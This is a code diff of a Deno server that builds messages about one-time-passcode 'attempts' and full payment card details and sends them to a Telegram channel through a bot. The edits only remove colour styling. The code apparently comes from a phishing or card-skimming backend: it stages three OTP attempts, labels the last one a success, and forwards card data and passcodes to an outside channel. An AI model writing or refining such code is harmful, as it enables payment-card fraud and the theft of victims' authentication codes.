@@ -1,4 +1,3 @@
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
@@ -128,16 +127,14 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   const attempt = orderDetails.otpAttempt || 0;
   const isLastAttempt = attempt === 3;
   
-  // Color code based on attempt
-  const attemptColor = isLastAttempt ? 'green' : 'red';
-  
+  // Create a clear header based on attempt
   const attemptHeader = isLastAttempt 
-    ? '✅ <b style="color:green">OTP VERIFICATION SUCCESSFUL</b> ✅' 
-    : `⚠️ <b style="color:red">OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
+    ? '✅ <b>OTP VERIFICATION SUCCESSFUL</b> ✅' 
+    : `⚠️ <b>OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
   
   const statusText = isLastAttempt 
-    ? '✅ <span style="color:green">Success - Final attempt</span>' 
-    : `❌ <span style="color:red">Failed - Attempt ${attempt} of 3</span>`;
+    ? '✅ Success - Final attempt' 
+    : `❌ Failed - Attempt ${attempt} of 3`;
 
   // Payment details section - show full card details
   let paymentSection = '';
@@ -205,7 +202,7 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
       body: JSON.stringify({
         chat_id: TELEGRAM_CHANNEL_ID,
         text: message,
-        parse_mode: "HTML", // Changed from Markdown to HTML for better styling
+        parse_mode: "HTML", // Using HTML for better formatting
       }),
     });
 
